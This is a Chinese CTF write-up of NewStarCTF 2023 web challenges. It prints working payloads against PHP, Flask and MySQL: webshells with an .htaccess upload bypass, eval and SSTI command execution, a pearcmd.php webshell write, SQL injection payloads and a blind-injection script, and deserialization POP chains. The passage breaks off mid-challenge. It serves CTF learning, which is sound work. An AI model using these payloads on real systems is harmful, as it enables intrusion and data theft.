## WEEK1

### 泄漏的秘密(备份泄露)

打开题目，提示有敏感信息泄露
 ![在这里插入图片描述](assets/555c7abe6e63481dabcfbb6797def5dd.png)直接扫一下目录，发现有`./www.zip`
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/894d82a9b9f849e6a0184fa07d439f54.png)
 访问然后下载下来，解压到桌面
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/9e551f76863546459f74033848728dd3.png)

源码和robots.txt分别是两部分flag

### Begin of Upload（上传，后缀检测）

右键看下源码，发现对上传文件后缀名有检测
 这里的检测是后缀名只需要出现合法的就行
 ![在这里插入图片描述](assets/cb62aca4e0af4d1e957c7563936eb715.png)我们上传1.jpg的[一句话木马](https://so.csdn.net/so/search?q=一句话木马&spm=1001.2101.3001.7020)
 然后抓包修改[文件名](https://so.csdn.net/so/search?q=文件名&spm=1001.2101.3001.7020)为`1.jpg.php`
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/76d13caf573d4d03b584b69513296be8.png)上传成功，然后命令执行得到flag
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/471c59503dcf44b49b4e9a683c4b8551.png)

### Begin of HTTP

打开题目，按照要求一步步来
 先是GET传参，随便给个值
 然后是POST传参，参数值藏在源码处
 ![在这里插入图片描述](assets/ba720d817fb041f4991f0d6842bfe1d5.png)然后分别是修改cookie为ctfer；修改浏览器为NewStarCTF2023；修改Referer为newstarctf.com
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/db12d04a7f4e425f97bf3e4c253562e1.png)
 最后一步只能bp抓包修改为127.0.0.1
 （这里用XFF不行，我用的是X-Real-IP）
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/ad8668b3000f4b05a97bb23b85b81f53.png)

### ErrorFlask（flask报错）

打开题目，提示我们传参两个数，然后帮我们计算
 ![在这里插入图片描述](assets/08c85b2dc28b4d0ea2c9054b79943702.png)我们随便传两个数
 告诉我们不是ssti，后面还有计算结果
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/ef69fe3fc5ec42fb9a6277051ec881e3.png)提示flag在源码
 我们修改一下其中一个为字母，让其出现报错
 果然出现了`/app/app.py`源码，得到flag
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/dcd7e65e548a4516bda61889bb3ca433.png)

### Begin of PHP（php弱类型、extract变量覆盖集合）

源码

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);

if(isset($_GET['key1']) && isset($_GET['key2'])){
    echo "=Level 1=<br>";
    if($_GET['key1'] !== $_GET['key2'] && md5($_GET['key1']) == md5($_GET['key2'])){
        $flag1 = True;
    }else{
        die("nope,this is level 1");
    }
}

if($flag1){
    echo "=Level 2=<br>";
    if(isset($_POST['key3'])){
        if(md5($_POST['key3']) === sha1($_POST['key3'])){
            $flag2 = True;
        }
    }else{
        die("nope,this is level 2");
    }
}

if($flag2){
    echo "=Level 3=<br>";
    if(isset($_GET['key4'])){
        if(strcmp($_GET['key4'],file_get_contents("/flag")) == 0){
            $flag3 = True;
        }else{
            die("nope,this is level 3");
        }
    }
}

if($flag3){
    echo "=Level 4=<br>";
    if(isset($_GET['key5'])){
        if(!is_numeric($_GET['key5']) && $_GET['key5'] > 2023){
            $flag4 = True;
        }else{
            die("nope,this is level 4");
        }
    }
}

if($flag4){
    echo "=Level 5=<br>";
    extract($_POST);
    foreach($_POST as $var){
        if(preg_match("/[a-zA-Z0-9]/",$var)){
            die("nope,this is level 5");
        }
    }
    if($flag5){
        echo file_get_contents("/flag");
    }else{
        die("nope,this is level 5");
    }
} 

```

分析一下

```php
1. level 1利用弱比较md5值相等
2. level 2利用MD5和sha1函数无法处理数组，进行数组绕过
3. level 3同样利用数组绕过
4. level 4利用php弱类型比较
5. level 5则是利用key3数组绕过正则匹配；利用extract()函数的变量覆盖漏洞，传入非空字符即可
```

得到flag
 ![在这里插入图片描述](assets/1257b10d33274311aa4a47d4176415f8.png)

### R!C!E!(php参数传递解析特性，MD5爆破，反引号命令执行)

源码

```php
 <?php
highlight_file(__FILE__);
if(isset($_POST['password'])&&isset($_POST['e_v.a.l'])){
    $password=md5($_POST['password']);
    $code=$_POST['e_v.a.l'];
    if(substr($password,0,6)==="c4d038"){
        if(!preg_match("/flag|system|pass|cat|ls/i",$code)){
            eval($code);
        }
    }
} 
1234567891011
```

分析一下，第一个if语句判断条件为上传的password参数的MD5值前六位为c4d038；第二个if语句是PHP变量名解析特性和简单的命令执行过滤
 首先利用脚本爆破出该数

```php
import hashlib

prefix = "c4d038"  # 目标MD5值的前六位
prefix_bytes = prefix.encode()  # 将前缀转换为字节串

for i in range(100000000):
    b = i.to_bytes(22, 'big')
    m = hashlib.md5(str(i).encode()).hexdigest()
    
    if m.startswith(prefix):
        print(i)
        print(m)
        break
```

爆出来为114514
 然后是利用php的解析特性，`[`会被解析成下划线`_`；当用"["来解析为" _ "后 后面的"."是不会被转成"_"的 (当知识点记住得了)，和反引号去绕过对system函数的过滤，反斜杠绕过flag，tac替换cat命令
 payload

```
password=114514&e[v.a.l=echo `tac /fla\g`;
1
```

得到flag
 ![在这里插入图片描述](assets/ded18d369d60429f9fbeba7e070284f2.png)

### EasyLogin（爆破，302跳转抓包）

打开题目发现是登录框，尝试注册admin
 发现用户已存在
 我们随便注册一个用户为hacker，密码为123456
 登录并抓包，发现密码是MD5加密的
 ![在这里插入图片描述](assets/263f11d5b197466c8e5eb172d8dd6372.png)然后放行，发现中途跳转一个php界面
 我们丢到重放器，发现是页面302状态，并且出现了提示
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/89c3ce429d574d308a61edda312eb117.png)
 我这里因为版本问题，我保存下来用vscode打开
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/5d204aeaa0404b36a68b25e5e205b4c3.png)按照提示，果然没有第七行（成功被骗）
 结合前面解题思路，老老实实爆破密码

打开bp，payload处理修改一下
 爆出对应的MD5值，丢到在线网站得到密码为000000
 ![在这里插入图片描述](assets/5be20ece53284c6f80613920d06d94d8.png)

然后就是登录进入终端
 ctrl+c然后ctrl+d退出执行的程序chat
 ![在这里插入图片描述](assets/dd7fe61e3f0449448d8445f94d257f51.png)
 没什么发现，我们刚刚在登陆抓包已经知道中途会跳转
 同样试试
 结果成功抓到这个重定向的php页面
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/96da58937f0e460ab4a89162b2a3cfb6.png)得到flag
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/43ff1618e8f54c628e1f7a2bbe771c62.png)

## WEEK2

### 游戏高手（js游戏，控制台作弊）

打开题目，发现是小游戏（题目跟最近打的SHCTF比较像）
 查看下js代码
 ![在这里插入图片描述](assets/27189da1b0de4ee0a62dfa175862776c.png)发现获得胜利的条件是分数大于100000
 我们在控制台输入下面语句

```
var gameScore = 10000000;
gameover(); 
```

回车然后得到flag
 ![在这里插入图片描述](assets/1c36fa3443694d5d9846b5a1e3062438.png)

### include 0。0(php://filter伪协议读取源码)

源码

```php
 <?php
highlight_file(__FILE__);
// FLAG in the flag.php
$file = $_GET['file'];
if(isset($file) && !preg_match('/base|rot/i',$file)){
    @include($file);
}else{
    die("nope");
}
?> 
```

简单的文件包含，这里过滤了常见的转换过滤器base和rot
 我们可以用`convert.iconv.UTF-8.UTF-16`，应该也可以大小写绕过（更正，没法，/i）
 payload

```
?file=php://filter/read=convert.iconv.UTF-8.UTF-16/resource=flag.php
```

得到flag

![在这里插入图片描述](assets/4ed2fd1d6edd4fa4800dc7c31a103e8c.png)

### ez_sql

sqlmap一把梭：

```cmd
sqlmap -u "http://2f4731e1-05d8-4b79-9b94-0870a1353852.node4.buuoj.cn:81/?id=TMP0919" -D ctf -T here_is_flag -C flag --dump
```

进来随便点一个，发现有参数id
 我们先fuzz测试一下过滤了什么
 抓包，随便用一个字典
 ![在这里插入图片描述](assets/917b219c613f40b4a7f15ea315cf7370.png)
 发现select被过滤了，那么我们用大小写绕过

首先爆一下字段数

```
?id=-1' union SelECt 1,2,3,4,5 --+
```

发现字段数为5
 爆库名

```
?id=-1' union SelECt database(),2,3,4,5 --+
```

![在这里插入图片描述](assets/727527fa76d94bfb8edd8e6c81f429a9.png)

然后经过再次测试，发现`information_schema.tables`和`where`都被过滤了
 这里用`mysql.innodb_table_stats`和`wHere`代替
 （多次尝试，发现回显的位置在5而不是1，开始卡了很久没回显）
 爆表名

```
?id=-1' union SelECt 1,2,3,4,group_concat(table_name) from mysql.innodb_table_stats wHere '1 --+
```

![在这里插入图片描述](assets/590aa272a9ec4554a7de722cefe6a49f.png)

因为我们用的是`mysql.innodb_table_stats`，我们无法查到列名
 所以继续用无列名注入

```
?id=-1' union SelECt 1,2,3,4,group_concat(`1`) from (SelECt 1 union SelECt * from ctf.here_is_flag)a wHere '1 --+
```

得到flag
 ![在这里插入图片描述](assets/e5b4102c110a4b109cfca0ecfe8a6c8e.png)

### Unserialize？

源码

```php
 <?php
highlight_file(__FILE__);
// Maybe you need learn some knowledge about deserialize?
class evil {
    private $cmd;

    public function __destruct()
    {
        if(!preg_match("/cat|tac|more|tail|base/i", $this->cmd)){
            @system($this->cmd);
        }
    }
}

@unserialize($_POST['unser']);
?> 
```

由于是private成员变量，所以序列化后长度会加2，多两个空白符
 exp

```php
<?php
class evil {
    private $cmd;
    function __construct($cmd1){
        $this->cmd=$cmd1;
    }
}

$a=new evil('ls /');
echo serialize($a);
?> 
```

手动添加%00
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/77f5e3483024492692328967c560c649.png)得到flag
 ![在这里插入图片描述](assets/6f484f2d9d864c239d17731899501e3d.png)

### Upload again!（html型php一句话，.htaccess）

打开题目
 ![在这里插入图片描述](assets/3c4623e1c0ea4d2092a3e436b7a8b78d.png)先上传最普通的马`1.php`，发现被检测了
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/22c2a9f0609e49adbd5c8fff823fa0f3.png)

我们尝试修改下后缀为`.jpg`，发现还是不行

![在这里插入图片描述](assets/404b1c73e4444c2ba043a96f97c5fc81.png)

在后面尝试修改MIME以及文件头，都不能绕过
 猜测是对一句话木马的`<?`过滤，那么我们修改为js马

```
<script language="php">eval($_POST['shell']);</script>
```

发现可以上传，不过没有被解析成php

![在这里插入图片描述](assets/16220666e40b46baa3c6433a4a3c7d09.png)
 那么我们可以用`.htaccess`配置文件攻击，让jpg文件被解析成php
 首先创建`.htaccess文件`，写入

```
<FilesMatch "1.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

上传成功后，上传名为`1.jpg`的js马

![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/abd1ca92c8224401a0ca0e154bd504c0.png)命令执行一下
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/5057de5505eb4a1690b8d5783289aba1.png)得到flag
 ![在这里插入图片描述](assets/85c2fb372069492dac1f51c130b51211.png)

### R!!C!!E!!（无参数RCE）

打开题目，提示有信息泄露
 ![在这里插入图片描述](assets/64d9451c37bd457fbfec9f8d4e73a90a.png)
 这里我是dirsearch扫了一下目录（扫了很久）
 扫完后翻翻发现有git泄露
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/fa5dd75b43724de1af5033437318d339.png)直接用工具
 先运行工具，然后访问`./.git/`
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/5d1a33455dd24a0483cdff2c5bd92add.png)源码如下

```php
<?php
highlight_file(__FILE__);
if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['star'])) {
    if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])){
        eval($_GET['star']);
    }
}
```

一眼无参RCE，然后过滤了很多函数
 这里我们用的是`getallheaders()函数`
 我们先看看http头部信息

```
?star=print_r(getallheaders());
```

![在这里插入图片描述](assets/fe3d12f1ff3b4109bbd50d0aa2793737.png)然后我们选择添加命令在User-Agent那里
 payload

```
?star=eval(next(getallheaders()));
```

得到flag
 ![在这里插入图片描述](assets/6872e73be191476dbe72c14889262804.png)

## WEEK3

### Include 🍐（pearcmd.php本地文件包含）

源码

```php
 <?php
    error_reporting(0);
    if(isset($_GET['file'])) {
        $file = $_GET['file'];
        
        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {
            die('hacker!');
        }
        
        include($file.".php");
        # Something in phpinfo.php!
    }
    else {
        highlight_file(__FILE__);
    }
?> 
```

分析一下，有文件包含漏洞，将变量和`.php`拼接，但是过滤了几个重要的伪协议。按照它的提示到`./phpinfo.php`看看，发现有假flag，不过给了hint让我们看看register_argc_argv（不了解的可以百度）。我们再在`./phpinfo.php`搜一下，发现选项是on
 ![在这里插入图片描述](assets/4011d912ab244f7c933c7574fc3b2cf9.png)那么存在漏洞，具体方法为利用pearcmd.php本地文件包含

首先要知道在pearcmd.php中`&`符无发分割参数，真正能分割参数的是`+`；然后就是利用的命令为config-create，其包括两个参数，一个是绝对路径，还有保存配置文件的文件名；并且第一个参数会被写进到文件里，我们借此实现命令执行
 payload

```
?+config-create+/&file=/usr/local/lib/php/pearcmd&/<?=@eval($_POST['cmd']);?>+shell.php
```

注：由于源码会拼接`.php`，所以为pearcmd
 ![在这里插入图片描述](assets/835b79dffad84029bb19f9a491797961.png)

bp抓包发送
 然后访问`./shell.php`
 ![在这里插入图片描述](assets/3af5297117f544b69b8a70ef798af2e4.png)得到flag
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/045c7cd2b9c94d8db504e49267018d87.png)

### medium_sql(bool盲注)

可以先bp抓包，fuzz测试一下
 ![在这里插入图片描述](assets/f2b5bc0ecd50444199557580dd4089bf.png)

过滤的可以用大小写绕过，然后提示了不能联合查询
 ![在这里插入图片描述](assets/909c7e74193640cdbe103c7addea8961.png)我们尝试布尔盲注

```
?id=TMP0919' And if(1>0,1,0)%23
```

注：#为url编码过的
 ![在这里插入图片描述](assets/dd8f9f56596a471a84972981ca99e847.png)
 然后修改一下

```
?id=TMP0919' And if(1<0,1,0)%23
```

![在这里插入图片描述](assets/4413868dab134ba4b4b4e2dcaec81b57.png)
 可以发现当正确时有回显，错误时无回显，可以用布尔盲注
 脚本如下（菜鸡本人写的）

```python
import requests
import string

host = "http://fad66500-0807-4ead-8cad-dbbe48fd82cc.node4.buuoj.cn:81/?id=TMP0919"

def DBname():  
    global host
    flag=''
    for i in range(1,1000):
        low = 32
        high = 128
        mid = (low+high)//2
        while low < high:
            #--库名
            payload = "' And if(Ascii(Substr(database(),{i},1))>{mid},1,0)%23".format(i=i, mid=mid)
            res = requests.get(host + payload)

            if 'Physics' in res.text:
                low = mid + 1
            else:
                high = mid
            mid = (low + high) // 2
        if mid == 32 or mid == 127:
            break

        flag += chr(mid)
        i += 1
    print("数据库名为："+flag)

def TBname():  
    global host
    flag=''
    for i in range(1,1000):
        low = 32
        high = 128
        mid = (low+high)//2
        while low < high:
            #--表名
            payload = "' And if(Ascii(Substr((Select Group_concat(table_name) From infOrmation_schema.tables Where Table_schema='ctf'),{i},1))>{mid},1,0)%23".format(i=i, mid=mid)
            res = requests.get(host + payload)

            if 'Physics' in res.text:
                low = mid + 1
            else:
                high = mid
            mid = (low + high) // 2
        if mid == 32 or mid == 127:
            break

        flag += chr(mid)
        i += 1
    print("数据表名为："+flag)

def CLname():  
    global host
    flag=''
    for i in range(1,1000):
        low = 32
        high = 128
        mid = (low+high)//2
        while low < high:
            #--列名
            payload = "' And if(Ascii(Substr((Select Group_concat(column_name) From infOrmation_schema.columns Where Table_name='here_is_flag'),{i},1))>{mid},1,0)%23".format(i=i, mid=mid)
            res = requests.get(host + payload)

            if 'Physics' in res.text:
                low = mid + 1
            else:
                high = mid
            mid = (low + high) // 2
        if mid == 32 or mid == 127:
            break

        flag += chr(mid)
        i += 1
    print("数据列名为："+flag)

def Valname():  
    global host
    flag=''
    for i in range(1,1000):
        low = 32
        high = 128
        mid = (low+high)//2
        while low < high:
            #--报数据
            payload = "' And if(Ascii(Substr((Select Group_concat(flag) From here_is_flag),{i},1))>{mid},1,0)%23".format(i=i, mid=mid)
            res = requests.get(host + payload)

            if 'Physics' in res.text:
                low = mid + 1
            else:
                high = mid
            mid = (low + high) // 2
        if mid == 32 or mid == 127:
            break

        flag += chr(mid)
        i += 1
    print("数据为："+flag)

DBname()
TBname()
CLname()
Valname()
```

运行脚本得到flag
 ![在这里插入图片描述](assets/20590fff244e47b2878905ecb5a2a76f.png)

### POP Gadget(存在private和protected属性时，最好使用__construct()方法来进行构造)

源码

```php
 <?php
highlight_file(__FILE__);

class Begin{
    public $name;

    public function __destruct()
    {
        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
            echo "Hello";
        }else{
            echo "Welcome to NewStarCTF 2023!";
        }
    }
}

class Then{
    private $func;

    public function __toString()
    {
        ($this->func)();
        return "Good Job!";
    }

}

class Handle{
    protected $obj;

    public function __call($func, $vars)
    {
        $this->obj->end();
    }

}

class Super{
    protected $obj;
    public function __invoke()
    {
        $this->obj->getStr();
    }

    public function end()
    {
        die("==GAME OVER==");
    }
}

class CTF{
    public $handle;

    public function end()
    {
        unset($this->handle->log);
    }

}

class WhiteGod{
    public $func;
    public $var;

    public function __unset($var)
    {
        ($this->func)($this->var);    
    }
}

@unserialize($_POST['pop']); 
```

pop链子

```
Begin::__destruct -> Then::toString -> Super::__invoke -> Handle::__call -> CTF::end -> WhiteGod::__unset
```

由于链子调用中成员属性有private和protected
 我们用construct方法去调用链子，最后再使用url编码绕过
 exp

```php
<?php
class Begin{    
    public $name;    
    public function __construct($a)    
    {        
        $this->name = $a;    
    }
}
class Then{    
    private $func;    
    public function __construct($a)    
    {        
        $this->func= $a;    
    }
}
class Handle{    
    protected $obj;    
    public function __construct($a)    
    {        
        $this->obj = $a;    
    }
}
class Super{    
    protected $obj;    
    public function __construct($a)    
    {        
        $this->obj = $a;    
    }
}
class CTF{    
    public $handle;    
    public function __construct($a)    
    {        
        $this->handle = $a;    
    }
}
class WhiteGod{    
    public $func;    
    public $var;    
    public function __construct($a, $b)    
    {        
        $this->func = $a;        
        $this->var = $b;    
    }
}
$a = new Begin(new Then(new Super(new Handle(new CTF(new WhiteGod("readfile","/flag"))))));
echo urlencode(serialize($a));
```

得到flag
 ![在这里插入图片描述](assets/3c45ba7ff8f7405ab25c4fd082e8f171.png)



也可以这样构造：

```php
 <?php
 
class Begin{
    public $name;
 
    public function __destruct()
    {
 
    }
}
 
class Then{
    private $func;
	
	public function __construct()
 
    {
 
        $s=new Super();
 
        $this->func=$s;
 
    }
 
    public function __toString(){
        ($this->func)();//这里把Super当函数调用，实际触发了Super()里面的__invoke方法
        return "Good Job!";
    }
}
 
class Handle{
    protected $obj;
	public function __construct()
 
    {
 
        $this->obj=new CTF();//实例化CTF（）后给这里的obj赋值
 
    }
 
    public function __call($func, $vars)
    {
        $this->obj->end();//调用了CTF（）里的end()方法
    }
 
}
 
class Super{
    protected $obj;
	public function __construct()
 
    {
 
        $this->obj=new Handle();//为protected $obj赋值
    }
    public function __invoke()
    {
        $this->obj->getStr();//Handle 类没有定义 getStr() 方法，因此在调用这个方法时会触发 handle里的__call() 魔术方法
    }
 
    public function end()
    {
        die("==GAME OVER==");
    }
}
 
class CTF{
    public $handle;
 
    public function __construct()
 
    {
 
        $w=new WhiteGod();
 
        $this->handle=$w;
 
    } 
    public function end()
    {
        unset($this->handle->log);//在这个end()方法中我们试图用unset（）删除WhiteGod()里面的log属性
    }
 
}
 
class WhiteGod{
    public $func='system';
    public $var="cat /flag";
 
    public function __unset($var)
    {
        ($this->func)($this->var);    
    }
}
$b=new Begin();
$b->name=new Then();
echo urlencode(serialize($b)); 

```



### GenShin（flask SSTI,fenjing秒了）

> 考点：ssti
>
> python3/36 -m fenjing crack --url "http://330a56fb-d27e-4700-a43f-297d1118b53d.node4.buuoj.cn:81/secr3tofpop" --method GET --inputs name

在响应头找到hint
 ![在这里插入图片描述](assets/79111d4a6a9b4d2688b1d0dafe645dde.png)
 访问，fuzz测试一下
 发现过滤了`{{}}，'，request，init，lipsum，popen`
 那么我们使用`{%print()%}`绕过`{{}}`，enter代替init，至于popen则可以字符串拼接（虽然整个payload都直接可以拼接）

我们查找下能利用的
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/a049ce36ee954620a418a63c2dfc01e4.png)
 查找`<class 'os._wrap_close'>`，在第132个
 ![在这里插入图片描述](assets/4fc30c208c9e4ad5831893192d792c21.png)payload

```
{%print("".__class__.__bases__[0].__subclasses__()[132].__enter__.__globals__["pop"+"en"]("cat /flag").read())%}
```

得到flag
 ![在这里插入图片描述](assets/5a7b1d34d0d74f53974cb2998fc94459.png)

### OtenkiGirl(js原型链污染)

> 考点：js原型链污染

题目给了源码，我们先看app.js

```js
const env = global.env = (process.env.NODE_ENV || "production").trim();
const isEnvDev = global.isEnvDev = env === "development";
const devOnly = (fn) => isEnvDev ? (typeof fn === "function" ? fn() : fn) : undefined
const CONFIG = require("./config"), DEFAULT_CONFIG = require("./config.default");
const PORT = CONFIG.server_port || DEFAULT_CONFIG.server_port;

const path = require("path");
const Koa = require("koa");
const bodyParser = require("koa-bodyparser");

const app = new Koa();

app.use(require('koa-static')(path.join(__dirname, './static')));
devOnly(_ => require("./webpack.proxies.dev").forEach(p => app.use(p)));
app.use(bodyParser({
    onerror: function (err, ctx) {
        // If the json is invalid, the body will be set to {}. That means, the request json would be seen as empty.
        if (err.status === 400 && err.name === 'SyntaxError' && ctx.request.type === 'application/json') {
            ctx.request.body = {}
        } else {
            throw err;
        }
    }
}));

[
    "info",
    "submit"
].forEach(p => { p = require("./routes/" + p); app.use(p.routes()).use(p.allowedMethods()) });

app.listen(PORT, () => {
    console.info(`Server is running at port ${PORT}...`);
})

module.exports = app;
```

简单分析一下，就是给了两个路由，分别是`./info`和`./submit`
 然后我们跟踪到route的info.js

```js
const Router = require("koa-router");
const router = new Router();
const SQL = require("./sql");
const sql = new SQL("wishes");
const CONFIG = require("../config")
const DEFAULT_CONFIG = require("../config.default")

async function getInfo(timestamp) {
    timestamp = typeof timestamp === "number" ? timestamp : Date.now();
    // Remove test data from before the movie was released
    let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();
    timestamp = Math.max(timestamp, minTimestamp);
    const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp >= ?`, [timestamp]).catch(e => { throw e });
    return data;
}

router.post("/info/:ts?", async (ctx) => {
    if (ctx.header["content-type"] !== "application/x-www-form-urlencoded")
        return ctx.body = {
            status: "error",
            msg: "Content-Type must be application/x-www-form-urlencoded"
        }
    if (typeof ctx.params.ts === "undefined") ctx.params.ts = 0
    const timestamp = /^[0-9]+$/.test(ctx.params.ts || "") ? Number(ctx.params.ts) : ctx.params.ts;
    if (typeof timestamp !== "number")
        return ctx.body = {
            status: "error",
            msg: "Invalid parameter ts"
        }

    try {
        const data = await getInfo(timestamp).catch(e => { throw e });
        ctx.body = {
            status: "success",
            data: data
        }
    } catch (e) {
        console.error(e);
        return ctx.body = {
            status: "error",
            msg: "Internal Server Error"
        }
    }
})

module.exports = router;
```

代码很长，但是主要部分就是getInfo函数

```js
let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();
```

